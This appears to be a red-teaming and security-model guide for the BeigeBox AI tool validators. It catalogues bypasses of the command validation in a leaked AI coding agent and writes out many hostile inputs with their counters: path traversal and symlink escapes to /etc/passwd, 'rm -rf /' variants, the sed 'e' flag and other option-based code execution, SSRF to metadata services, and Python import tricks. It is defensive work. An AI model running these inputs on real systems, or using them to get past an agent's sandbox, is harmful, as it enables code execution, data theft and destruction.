# Security Bypass Guide & Red-Teaming

**Purpose:** This document teaches you how to find bypasses in BeigeBox's security validators.

We're publishing this because:
1. **Transparency** — We don't hide our threat model
2. **Red-teaming** — Help us find bypasses before attackers do
3. **Accountability** — Security through obscurity is theater

## Background: The Claude Code Lesson

In March 2026, Anthropic's Claude Code source was leaked, revealing **8 critical bypasses** in their parameter validation:

| Bypass | Tool | Method | Impact |
|--------|------|--------|--------|
| Argument abbreviation | git | `--upload-pa` → `--upload-pack` | RCE |
| Undocumented option | man | `--html=CMD` | RCE |
| Undocumented option | sed | `e` modifier | RCE |
| Undocumented option | sort | `--compress-program` | RCE |
| Variable expansion | ripgrep | `$IFS` instead of space | RCE |
| Chained expansion | bash | `${var@P}` modifier | RCE |
| File write | history | `history -a ~/.bashrc` | Persistence |

**Lesson:** Regex-based blocklists WILL be bypassed. Defense must focus on isolation.

---

## BeigeBox Security Model

### Layer 1: Isolation (Strongest)

```python
WORKSPACE_ROOT = /home/jinx/workspace
ALLOWED_READ = /home/jinx/workspace/in, /home/jinx/workspace/out
ALLOWED_WRITE = /home/jinx/workspace/out

# Attack: Read /etc/passwd
Path("/etc/passwd").resolve() → /etc/passwd
Does /etc/passwd start with /home/jinx/workspace? NO
Result: DENY (can't be bypassed without actual filesystem changes)
```

**How to bypass this layer:**
- Change the filesystem (mount symlinks, bind mounts) - requires root
- Exploit Path.resolve() behavior - unlikely in Python stdlib
- Use a 0-day in Python pathlib - possible but requires known exploit

**Red-team approach:**
```bash
# Preparation phase
mkdir -p /tmp/workspace_escape
ln -s /etc /tmp/workspace_escape/secret
mount --bind /etc /home/jinx/workspace/in/secret

# Attack phase
validator.validate_path_read("secret/passwd")
# Result: Reads /etc/passwd through symlink
```

**Counter:** We check `is_symlink()` on final path AND all parents.

---

### Layer 2: Allowlist Validation (Strict)

```python
# ALLOWED COMMANDS
ALLOWED = {"cat", "head", "tail", "grep", ...}

# Attack: Execute "rm -rf /"
cmd = "rm -rf /"
base_cmd = "rm"
"rm" in ALLOWED? NO
Result: DENY
```

**How to bypass this layer:**
- Invoke command through different mechanism (shell aliases, functions)
- Use full path: `/bin/rm` instead of `rm`
- Invoke through a different allowed command

**Red-team approach:**

```bash
# Approach 1: Aliased command
alias cat="/bin/rm -rf /"
cat something  # Actually executes rm -rf /

# Approach 2: Full path (if full paths are accepted)
/bin/bash -c "rm -rf /"

# Approach 3: Using allowed command as vector
echo '$(rm -rf /)' | sed 's/^/rm /' 
# If sed is allowed, piping harmful input through it

# Approach 4: Environment variable
export SHELL=/bin/rm
sh  # Invokes /bin/rm as shell
```

**Counter:** We should:
1. Only accept base command name (no paths)
2. Validate against shell aliases/functions
3. Use absolute paths internally: `/bin/cat`, `/usr/bin/grep`
4. Drop environment variables that could be weaponized

---

### Layer 3: Semantic Detection (Bonus)

We scan for known attack patterns:

```python
# Pattern 1: Directory traversal
if ".." in path or "$" in path:
    DENY

# Pattern 2: Command injection
if "$(", "`", "${" in cmd:
    DENY

# Pattern 3: Null bytes
if "\x00" in path:
    DENY
```

**How to bypass this layer:**
- Use patterns we don't check for yet
- Use encoding/unicode tricks
- Use undocumented command options (like Claude Code's sed `e`)

**Red-team approach:**

```python
# Approach 1: Unicode tricks
path = "..​/" (with zero-width space)
path = "＄(command)" (fullwidth characters)

# Approach 2: Encoding tricks
path = "..%2f" (URL-encoded)
path = "..%5c" (backslash-encoded)

# Approach 3: Undocumented command options
echo test | sed 's/test/$(rm -rf \/)/e'  # sed 'e' flag executes result

# Approach 4: Whitespace tricks
# Similar to Claude Code's 50-subcommand bypass:
cmd = "echo a && echo b && ... && echo z && rm -rf /"
if len(cmd.split("&&")) > LIMIT:
    # Skip validation!
```

**Counter:**
1. Don't rely on pattern matching - use actual filesystem validation
2. Reject anything with unusual characters/encodings
3. Know all command options (use `man page` or official docs)
4. Validate the entire command structure, not just detect patterns

---

## Tool-Specific Attack Vectors

### WorkspaceFile Tool

**Legitimate use:**
```python
validator.validate_path_read("out/report.md")
# Returns: /home/jinx/workspace/out/report.md (canonicalized)
```

**Attack vectors:**

#### 1. Path Traversal (All Variants)

```python
# Variant 1: Classic
"../../../etc/passwd"

# Variant 2: URL-encoded
"..%2f..%2fetc%2fpasswd"

# Variant 3: Double-encoded  
"..%252f..%252fetc%252fpasswd"

# Variant 4: Mixed encoding
"..\\etc\\passwd"  # Windows style

# Variant 5: Unicode tricks
"．．／etc／passwd"  # Fullwidth dot
"⁄" (fraction slash U+2044)

# Variant 6: Null bytes (old trick)
"../../../etc/passwd\x00.txt"
# Some older systems: read up to null, ignoring .txt
```

**Why they work/don't work:**
- Classic `../` works if regex check is missing or incomplete
- URL encoding works if decoder is applied BEFORE validation
- Unicode tricks work if validator only checks ASCII
- Null bytes only work on systems with null-byte vulnerabilities (not modern Python)

**Detection:** Our isolation validator rejects all because:
```python
candidate = (workspace_root / path).resolve()
# Path.resolve() normalizes EVERYTHING (including ..), resolves symlinks
# After resolution, we check: is candidate under workspace_root?
# Even if path looks weird, it must resolve safely
```

#### 2. Symlink Escape

```python
# Preparation (attacker has write access to workspace)
ln -s /etc/passwd /home/jinx/workspace/in/evil_link

# Attack
validator.validate_path_read("in/evil_link")
# This resolves to /etc/passwd!
```

**Why it works:**
- If validator only checks "is path under workspace", symlinks bypass this
- `Path.resolve()` resolves symlinks, so we'd see `/etc/passwd`

**Detection:** We check:
```python
if candidate.is_symlink():
    DENY("Symlinks not allowed")

# Also check all parents for symlinks
for parent in candidate.parents:
    if parent.is_symlink():
        DENY("Symlink in path chain")
```

**Remaining risk:** If attacker has `root` and can change filesystem (mount bind, etc.), they can escape. But that's out-of-scope - they already have full system control.

#### 3. Race Condition (TOCTOU)

```python
# Time-of-check vs. time-of-use
# Validation happens at T1, file is accessed at T2
# Attacker changes file between T1 and T2

# T1: validator checks /workspace/out/file.txt - OK
# T1.5: Attacker: ln -s /etc/passwd /workspace/out/file.txt
# T2: Code reads the file -> reads /etc/passwd!
```

**Why it's hard to fix:**
- File could change between validation and use
- Would need to validate again before EVERY filesystem access
- Performance overhead

**Detection:** We mitigate by:
1. Returning canonicalized path from validator
2. Code uses returned path directly (no symlink resolution at use time)
3. For high-security operations, re-validate before use

---

### NetworkAudit Tool

**Legitimate use:**
```python
validator.validate_network_audit({
    "network": "10.0.0.0/24",  # RFC1918 private
    "ports": "22,80,443"
})
```

**Attack vectors:**

#### 1. SSRF - Targeting Internal Services

```python
# Attack 1: Localhost
{"network": "127.0.0.1"}
# Validator check: is_loopback? YES
# Result: DENY ✓

# Attack 2: Metahost addressing  
{"network": "169.254.169.254"}  # AWS metadata service
# Validator check: is in RFC1918? NO
# Result: DENY ✓

# Attack 3: Hex encoding
{"network": "0x7f000001"}  # 127.0.0.1 in hex
# Validator: ipaddress.ip_network("0x7f000001") → ValueError
# Result: DENY (caught as invalid input) ✓

# Attack 4: Octal encoding
{"network": "0177.0.0.1"}  # 127.0.0.1 in octal
# Python's ipaddress module: May accept this?
# Need to test.
```

**Detection:** Our validator uses Python's `ipaddress` module which:
- Validates IP format strictly
- Rejects obvious encodings
- But may accept octal/hex in some cases

**Improvement needed:**
```python
def validate_network_audit(...):
    # Reject if not decimal notation
    if not re.match(r'^\d+\.\d+\.\d+\.\d+/\d+$', network):
        DENY("Only decimal IPv4 notation allowed")
```

#### 2. Resource Exhaustion

```python
# Attack 1: Scan entire internet
{"network": "0.0.0.0/0"}  # Way too broad
# Validator check: prefixlen < 24? YES
# Result: DENY ✓

# Attack 2: Scan a large subnet
{"network": "10.0.0.0/8"}  # 16 million IPs
# Validator check: prefixlen < 24? YES (8 < 24)
# Result: DENY ✓

# Attack 3: Ports explosion
{"ports": "1-65535"}  # All ports
# Validator check: len > 100? YES
# Result: DENY ✓

# Attack 4: Scan with huge timeout
{"timeout": 999999}
# Validator check: timeout > 30s? YES
# Result: DENY (capped to 30s) ✓
```

**Result:** Resource exhaustion is well-defended.

---

### Python Tool

**Legitimate use:**
```python
validator.validate_python({
    "code": "import json\nprint(json.loads(data))"
})
```

**Attack vectors:**

#### 1. Dangerous Imports

```python
# Attack 1: Direct import
code = "import os; os.system('rm -rf /')"
# Validator check: "import os" matches _DANGEROUS_IMPORTS
# Result: DENY ✓

# Attack 2: Indirect import
code = "__import__('os').system('rm -rf /')"
# Validator check: "__import__" matches _DUNDER_ACCESS
# Result: DENY ✓

# Attack 3: From import (different syntax)
code = "from os import system; system('rm -rf /')"
# Validator check: "from os import" matches _DANGEROUS_IMPORTS
# Result: DENY ✓

# Attack 4: Late binding import
code = "x = __import__; x('os').system('...')"
# Validator check: DOES IT CATCH THIS?
# Depends on regex: r"\b__import__\b"
# This might NOT match because ` = ` might break word boundary
# POTENTIAL BYPASS!
```

**Remaining risks:**
1. Obfuscation: `"im" + "port os"`
2. Late binding through variables
3. Reflection/introspection techniques
4. Using allowed modules to import forbidden ones

**Improvement:** Add dynamic analysis
```python
# Instead of just regex, actually compile and analyze the AST
import ast
tree = ast.parse(code)
# Walk the tree looking for dangerous calls
# Regex is insufficient for Python
```

---

## General Bypass Strategies

### 1. Encoding/Unicode Tricks

```
Original pattern: ".."
Bypass: "．．" (fullwidth dot)
Bypass: "%2e%2e" (URL-encoded)
Bypass: "..​" (with zero-width space)
Bypass: "..​" (with format override character U+202E)
```

**Counter:** Don't whitelist patterns, blacklist-validate actual results:
```python
# Bad: regex check
if ".." in path:
    DENY

# Good: actual behavior check
canonical = resolve(path)
if canonical outside boundary:
    DENY
```

### 2. Undocumented Command Options

```
man --html="touch /tmp/pwned" man
sed 's/x/y/e'  # e flag executes
sort --compress-program "sh"
history -a ~/.bashrc
```

**Counter:** Know your tools
```python
# Instead of trying to block every option
DANGEROUS_OPTIONS = {"--html", "-e", "--compress-program", "-a"}

# Better: only ALLOW specific safe options
SAFE_OPTIONS = {"--version", "--help", "-v"}
```

### 3. Argument Abbreviation

```
git --upload-pa  # Interpreted as --upload-pack by git
```

**Counter:** Use full binary paths + explicit argument parsing
```python
# Bad: just check string
if "--upload-pack" not in cmd:
    OK

# Good: parse properly
args = shlex.split(cmd)
for arg in args:
    if arg.startswith("--upload"):
        DENY("--upload* not allowed")
```

### 4. Chained Expansions

```
echo ${one="$"}${two="$one(touch /tmp/pwned)"}${two@P}
```

**Counter:** Don't allow parameter expansions at all
```python
# Block ALL shell expansion syntax
dangerous = ["${", "$(", "`", "$((", "$!", "$?"]
for pattern in dangerous:
    if pattern in cmd:
        DENY
```

---

## Red-Team Checklist

Use this checklist when testing BeigeBox's security:

### Path Validation
- [ ] Test classic path traversal: `../../../etc/passwd`
- [ ] Test URL-encoded: `..%2f..%2fetc`
- [ ] Test mixed case/encoding
- [ ] Test with null bytes: `file.txt\x00.jpg`
- [ ] Test symlink escape (if you have write access)
- [ ] Test unicode lookalikes
- [ ] Test with trailing spaces/special chars

### Command Validation
- [ ] Test full paths: `/bin/cat`
- [ ] Test command aliases
- [ ] Test shell functions
- [ ] Test command substitution: `$(cmd)`, `` `cmd` ``, `$((cmd))`
- [ ] Test variable expansion: `$var`, `${var}`, `${var@P}`
- [ ] Test environment variable hijacking: `PATH=`, `LD_PRELOAD=`
- [ ] Test undocumented command options

### Network Validation
- [ ] Test octal IP encoding: `0177.0.0.1`
- [ ] Test hex IP encoding: `0x7f000001`
- [ ] Test IPv6 localhost: `::1`
- [ ] Test metadata services: `169.254.169.254`
- [ ] Test with CIDR boundaries
- [ ] Test timeout values (negative, zero, huge)

### Python Code Validation
- [ ] Test obfuscated imports: `__imp` + `ort`
- [ ] Test late binding: `x = __import__; x("os")`
- [ ] Test via allowed modules: `json.__reduce_ex__`
- [ ] Test multiline code with nested blocks
- [ ] Test with comments: `# import os` (should be caught)

---

## Reporting Bypasses

If you find a bypass:

1. **Document it:**
   - Exact input that triggers the bypass
   - What security check it bypasses
   - What damage it allows

2. **Email:** `security@ralabarge.dev`
   - Don't post publicly
   - Give us time to patch (30 days)

3. **Get credited:**
   - Your name in release notes
   - Public acknowledgment
   - Optional: bounty (TBD)

---

## Known Limitations

We acknowledge these are HARD to defend against:

1. **Root access** — If attacker has root, isolation breaks
2. **0-day exploits** — Python stdlib bugs, kernel bugs
3. **Hardware attacks** — Rowhammer, side-channels
4. **Supply chain** — Compromised dependencies

We focus on:
- Isolation (hardest to bypass)
- Detection (honeypots, logging)
- Response (audit trail, incident response)

---

## Resources

- **Claude Code leak analysis:** https://flatt.tech/research/posts/pwning-claude-code-in-8-different-ways/
- **OWASP LLM Top 10:** https://genai.owasp.org/
- **CWE-78 (OS Command Injection):** https://cwe.mitre.org/data/definitions/78.html
- **Path Traversal (CWE-22):** https://cwe.mitre.org/data/definitions/22.html

